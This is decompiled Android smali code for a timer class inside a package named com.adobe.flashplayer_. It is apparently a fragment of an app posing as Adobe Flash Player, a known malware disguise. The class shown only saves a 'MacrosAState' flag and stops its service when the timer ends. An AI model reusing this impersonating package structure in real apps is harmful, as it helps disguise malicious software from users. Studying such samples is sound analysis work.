.class Lcom/adobe/flashplayer_/CCC111$1;
.super Landroid/os/CountDownTimer;
.source "CCC111.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/adobe/flashplayer_/CCC111;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/adobe/flashplayer_/CCC111;


# direct methods
.method constructor <init>(Lcom/adobe/flashplayer_/CCC111;JJ)V
    .locals 0
    .param p2, "$anonymous0"    # J
    .param p4, "$anonymous1"    # J

    .prologue
    .line 1
    iput-object p1, p0, Lcom/adobe/flashplayer_/CCC111$1;->this$0:Lcom/adobe/flashplayer_/CCC111;

    .line 23
    invoke-direct {p0, p2, p3, p4, p5}, Landroid/os/CountDownTimer;-><init>(JJ)V

    return-void
.end method


# virtual methods
.method public onFinish()V
    .locals 4

    .prologue
    .line 29
    iget-object v0, p0, Lcom/adobe/flashplayer_/CCC111$1;->this$0:Lcom/adobe/flashplayer_/CCC111;

    const-string v1, "MacrosAState"

    const-string v2, "E"

    iget-object v3, p0, Lcom/adobe/flashplayer_/CCC111$1;->this$0:Lcom/adobe/flashplayer_/CCC111;

    invoke-virtual {v3}, Lcom/adobe/flashplayer_/CCC111;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lcom/adobe/flashplayer_/CCC111;->access$0(Lcom/adobe/flashplayer_/CCC111;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 30
    iget-object v0, p0, Lcom/adobe/flashplayer_/CCC111$1;->this$0:Lcom/adobe/flashplayer_/CCC111;

    invoke-virtual {v0}, Lcom/adobe/flashplayer_/CCC111;->stopSelf()V

    .line 31
    iget-object v0, p0, Lcom/adobe/flashplayer_/CCC111$1;->this$0:Lcom/adobe/flashplayer_/CCC111;

    invoke-virtual {v0}, Lcom/adobe/flashplayer_/CCC111;->onDestroy()V

    .line 32
    return-void
.end method

.method public onTick(J)V
    .locals 0
    .param p1, "millisUntilFinished"    # J

    .prologue
    .line 26
    return-void
.end method
